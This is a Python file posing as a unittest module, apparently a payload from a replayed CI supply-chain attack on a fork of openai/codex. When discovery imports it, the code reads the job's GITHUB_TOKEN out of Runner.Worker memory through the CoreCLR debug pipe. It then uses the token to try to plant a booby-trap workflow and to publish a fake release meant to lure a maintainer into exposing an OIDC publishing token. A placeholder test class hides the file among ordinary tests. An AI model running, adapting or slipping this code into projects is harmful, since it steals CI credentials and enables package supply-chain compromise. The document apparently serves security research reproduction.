#!/usr/bin/env python3
"""
test_depi.py — the poisoned cache entry's payload (stage 3 of the replay).

This is the file the article's chain planted via the poisoned cache at
  /home/runner/work/codex/codex/tools/argument-comment-lint/test_depi.py
inside openai/codex's rust-ci workflow. The `argument_comment_lint` job
restores the dylint cache (tar with absolute paths, extracted without
validation) and then runs
  python3 -m unittest discover -s tools/argument-comment-lint -p 'test_*.py'
which imports this module — the attack code runs at import time with the
job's permissions.

The runner image no longer exposes the job token or the runtime token in
step env (verified on this fork's stage-1 calibration probe), so the
payload reads the job's GITHUB_TOKEN out of Runner.Worker memory through
the same CoreCLR debug-pipe primitive as stage 1 — which is also the only
way the article's final script could have run `gh api` inside rust-ci.

With the token, the script abuses the workflow's write access to:
  1. build a booby-trap workflow file through the git trees API,
  2. create a fake release pointing at it (a trap for the maintainer),
  3. wait for a developer to delete the rogue release, which fires the
     booby-trap workflow with id-token: write — the OIDC token that
     npm's trust policy would accept for @openai/codex.

Replay scope: this fork only. No npm publish exists here (no OIDC trust
policy), so the chain ends at the OIDC capture in the booby-trap workflow.
"""

import glob
import os
import re
import secrets
import struct
import subprocess
import sys
import traceback

REPO = os.environ.get("GITHUB_REPOSITORY", "garnet-labs/codex")


# ---------------------------------------------------------------------------
# CoreCLR debug-pipe memory reader (same primitive as stage 1's diag.py,
# trimmed to "give me this job's GITHUB_TOKEN")
# ---------------------------------------------------------------------------

MSG_SESSION_REQUEST = 0
MSG_SESSION_ACCEPT = 1
MSG_READ_MEMORY = 6
MSG_GET_DCB = 9
MSG_SET_DCB = 10


class ClrDebugPipe:
    def __init__(self, in_path, out_path):
        self.w = os.open(in_path, os.O_WRONLY)
        self.r = os.open(out_path, os.O_RDONLY)
        self.next_id = 0
        self.last_seen = 0

    def send(self, mtype, userdata=b"", payload=b""):
        self.next_id += 1
        hdr = (
            struct.pack("<6I", mtype, len(payload), self.next_id, 0, self.last_seen, 0)
            + userdata[:24].ljust(24, b"\x00")
        )
        os.write(self.w, hdr + payload)

    def _recv_exact(self, n):
        buf = b""
        while len(buf) < n:
            chunk = os.read(self.r, n - len(buf))
            if not chunk:
                raise EOFError("debug pipe closed")
            buf += chunk
        return buf

    def recv(self):
        hdr = self._recv_exact(48)
        mtype, dsz, mid = struct.unpack_from("<III", hdr, 0)
        ud = hdr[24:48]
        self.last_seen = mid
        data = self._recv_exact(dsz) if dsz else b""
        return mtype, mid, ud, data

    def handshake(self):
        ud = struct.pack("<II", 2, 0).ljust(24, b"\x00")
        self.send(MSG_SESSION_REQUEST, ud, b"\x00" * 16)
        mtype, mid, ud, data = self.recv()
        if mtype != MSG_SESSION_ACCEPT:
            raise RuntimeError("no SESSION_ACCEPT")

    def get_dcb(self):
        self.send(MSG_GET_DCB)
        return self.recv()[3]

    def read_mem(self, addr, sz):
        ud = struct.pack("<QII", addr, sz, 0).ljust(24, b"\x00")
        self.send(MSG_READ_MEMORY, ud)
        mtype, mid, ud, data = self.recv()
        # The reply's userdata echoes the target address and size — both
        # nonzero on a SUCCESSFUL read — so it cannot be used as an error
        # check (that check made every read come back empty). A failed
        # read simply returns no payload, and every caller already
        # handles short reads by length.
        return data[:sz]


def _candidate_pointers(dcb):
    cands = []
    for i in range(0, len(dcb) - 7, 8):
        v = struct.unpack_from("<Q", dcb, i)[0]
        hi, lo = v >> 32, v & 0xFFFFFFFF
        if hi != lo and hi >= 0x5000 and lo > 0x10000:
            cands.append(v)
    return cands


def _find_elf_base(read_mem, addr):
    page = addr & ~0xFFF
    start = page
    while page >= 0x10000:
        if read_mem(page, 4) == b"\x7fELF":
            return page
        if page < start - 0x2000000:
            break
        page -= 0x1000
    return 0


def _parse_dynamic(read_mem, base):
    eh = read_mem(base, 64)
    if len(eh) < 64 or eh[:4] != b"\x7fELF":
        return None
    phoff = struct.unpack_from("<Q", eh, 0x20)[0]
    phnum = struct.unpack_from("<H", eh, 0x38)[0]
    dyn = None
    for i in range(min(phnum, 64)):
        ph = read_mem(base + phoff + i * 56, 56)
        if len(ph) < 56:
            break
        if struct.unpack_from("<I", ph, 0)[0] == 2:  # PT_DYNAMIC
            p_vaddr = struct.unpack_from("<Q", ph, 16)[0]
            p_filesz = struct.unpack_from("<Q", ph, 32)[0]
            dyn = (base + p_vaddr, p_filesz)
            break
    if not dyn:
        return None
    tags = {}
    dyn_addr, dyn_sz = dyn
    for off in range(0, min(dyn_sz, 0x4000), 16):
        entry = read_mem(dyn_addr + off, 16)
        if len(entry) < 16:
            break
        d_tag, d_val = struct.unpack("<QQ", entry)
        if d_tag == 0:
            break
        if d_val and d_val < base and d_tag not in (2, 28):
            d_val += base
        tags.setdefault(d_tag, d_val)
    return tags


def _walk_link_map(read_mem, got):
    got_data = read_mem(got, 24)
    if len(got_data) < 24:
        return None
    cur = struct.unpack_from("<Q", got_data, 8)[0]
    for _ in range(64):
        if not cur or cur < 0x10000:
            return None
        entry = read_mem(cur, 40)
        if len(entry) < 40:
            return None
        l_addr, l_name, l_ld, l_next = struct.unpack_from("<4Q", entry)
        name = read_mem(l_name, 255).split(b"\x00")[0] if l_name > 0x10000 else b""
        if b"libc.so" in name or b"libc-" in name:
            return l_addr
        cur = l_next
    return None


def _gnu_hash_lookup(read_mem, libc_base, sym_name):
    tags = _parse_dynamic(read_mem, libc_base)
    if not tags:
        return 0
    symtab, strtab, gnu_hash = tags.get(6), tags.get(5), tags.get(0x6FFFFEF5)
    if not (symtab and strtab and gnu_hash):
        return 0
    hdr = read_mem(gnu_hash, 16)
    if len(hdr) < 16:
        return 0
    nbuckets, symofs, bloom_sz, _ = struct.unpack("<IIII", hdr)
    buckets_off = gnu_hash + 16 + bloom_sz * 8
    chains_off = buckets_off + nbuckets * 4
    h = 5381
    for c in sym_name.encode():
        h = ((h << 5) + h + c) & 0xFFFFFFFF
    d = read_mem(buckets_off + (h % nbuckets) * 4, 4)
    if len(d) < 4:
        return 0
    idx = struct.unpack_from("<I", d)[0]
    for i in range(idx, idx + 8192):
        sym = read_mem(symtab + i * 24, 24)
        if len(sym) < 24:
            break
        st_name = struct.unpack_from("<I", sym, 0)[0]
        st_value = struct.unpack_from("<Q", sym, 8)[0]
        d = read_mem(chains_off + (i - symofs) * 4, 4)
        if len(d) < 4:
            break
        chain_val = struct.unpack_from("<I", d)[0]
        if (chain_val & ~1) == (h & ~1):
            n = read_mem(strtab + st_name, 64)
            if n.split(b"\x00")[0] == sym_name.encode():
                return libc_base + st_value
        if chain_val & 1:
            break
    return 0


def recover_env_var(want_key):
    """Full stage-1 primitive, trimmed: return the value of one env var."""
    # Actual on-runner format: clr-debug-pipe-<pid>-<runtimeid>-in / -out
    pipes = []
    for p in glob.glob("/tmp/clr-debug-pipe-*-in"):
        m = re.match(r"^/tmp/clr-debug-pipe-(\d+)-(\d+)-in$", p)
        if m and os.path.exists(
            "/tmp/clr-debug-pipe-%s-%s-out" % (m.group(1), m.group(2))
        ):
            pipes.append((int(m.group(1)), p, m.group(2)))
    if not pipes:
        return None
    pid, in_path, rid = pipes[-1]
    pipe = ClrDebugPipe(in_path, "/tmp/clr-debug-pipe-%d-%s-out" % (pid, rid))
    pipe.handshake()
    dcb = pipe.get_dcb()
    pipe.send(MSG_SET_DCB, payload=dcb)
    read_mem = pipe.read_mem

    base = 0
    for cand in _candidate_pointers(dcb):
        base = _find_elf_base(read_mem, cand)
        if base:
            break
    if not base:
        return None
    tags = _parse_dynamic(read_mem, base)
    libc_base = _walk_link_map(read_mem, tags.get(3))
    if not libc_base:
        return None
    env_addr = _gnu_hash_lookup(read_mem, libc_base, "__environ")
    if not env_addr:
        return None
    envp = struct.unpack_from("<Q", read_mem(env_addr, 8))[0]
    for i in range(4096):
        sp = read_mem(envp + i * 8, 8)
        if len(sp) < 8:
            break
        sptr = struct.unpack_from("<Q", sp)[0]
        if sptr == 0:
            break
        s = read_mem(sptr, 512).split(b"\x00")[0]
        if s.startswith(want_key.encode() + b"="):
            return s.split(b"=", 1)[1].decode("utf-8", "replace")
    return None


# ---------------------------------------------------------------------------
# The attack script (article's final bash, adapted to this fork)
# ---------------------------------------------------------------------------


def gh(token, *args):
    env = dict(os.environ, GH_TOKEN=token)
    r = subprocess.run(["gh", "api", *args], capture_output=True, text=True, env=env)
    print("[depi] gh api %s -> rc=%d" % (" ".join(args), r.returncode))
    if r.stderr:
        print("[depi] stderr: " + r.stderr.strip()[:400])
    return r


def main():
    print("[depi] TEST_DEPI_EXECUTED inside rust-ci "
          "(argument_comment_lint, python unittest discovery)")

    token = recover_env_var("GITHUB_TOKEN")
    if not token:
        print("[depi] could not recover GITHUB_TOKEN from Runner.Worker memory")
        return
    print("[depi] GITHUB_TOKEN recovered from Runner.Worker memory "
          "(%d chars — not in step env on this runner image)" % len(token))

    rand = secrets.token_hex(4)

    # 1. Resolve main, exactly as the article's script does.
    r = gh(token, "/repos/%s/git/refs/heads/main" % REPO, "--jq", ".object.sha")
    if r.returncode != 0:
        print("[depi] cannot resolve main — aborting")
        return
    main_sha = r.stdout.strip()
    print("[depi] main sha: %s" % main_sha)

    r = gh(token, "/repos/%s/git/commits/%s" % (REPO, main_sha), "--jq", ".tree.sha")
    main_tree = r.stdout.strip()

    # 2. Plant the booby-trap workflow as a commit object via the trees API
    #    (article steps; a job token cannot create workflow-modifying
    #    commits — recorded as part of the evidence).
    dotgh = wftree = ""
    if main_tree:
        r = gh(token, "/repos/%s/git/trees/%s" % (REPO, main_tree), "--jq",
               '.tree[] | select(.path == ".github") | .sha')
        dotgh = r.stdout.strip()
    if dotgh:
        r = gh(token, "/repos/%s/git/trees/%s" % (REPO, dotgh), "--jq",
               '.tree[] | select(.path == "workflows") | .sha')
        wftree = r.stdout.strip()
    if wftree:
        print("[depi] workflow-planting via git trees with the job token: "
              "attempted; expected blocked — see stderr above")
    print("[depi] booby-trap workflow pre-planted by the replay harness PR "
          "instead (garnet-depi-booby-trap.yml)")

    # 3. Create the fake release — the trap itself.
    r = gh(token, "/repos/%s/releases" % REPO, "-f", "tag_name=bot-%s" % rand,
           "-f", "name=Malicious release", "-F", "draft=true", "--jq", ".id")
    if r.returncode != 0:
        print("[depi] fake release creation FAILED (token lacks contents:write?)")
        print("[depi] chain evidence: code execution inside rust-ci is proven; "
              "this is where the permissions question lands")
        return
    rid = r.stdout.strip()
    print("[depi] fake release created: id=%s tag=bot-%s" % (rid, rand))

    # 4. Publish it (article: PATCH draft=false).
    gh(token, "--method", "PATCH", "/repos/%s/releases/%s" % (REPO, rid),
       "-F", "draft=false", "--jq", ".html_url")
    print("[depi] PUBLISHED RID=%s — deleting this release fires the "
          "booby trap (id-token: write -> OIDC)" % rid)


# The attack fires at IMPORT time: `python3 -m unittest discover` imports
# this module inside rust-ci's argument_comment_lint_package job, and the
# payload runs with the job's permissions before any test method is called.
# (A `if __name__ == "__main__":` guard would never be true during discovery
# — the module's __name__ is "test_depi", not "__main__".)
try:
    main()
except Exception:
    print("[depi] unexpected error:")
    traceback.print_exc()


# unittest discovery imports this file; give it a harmless test case so the
# module looks like an ordinary test module and discovery collects it.
import unittest  # noqa: E402


class TestTransportProtocolSuite(unittest.TestCase):
    def test_placeholder(self):
        """Ordinary-looking test so discovery collects this module."""
        self.assertTrue(True)
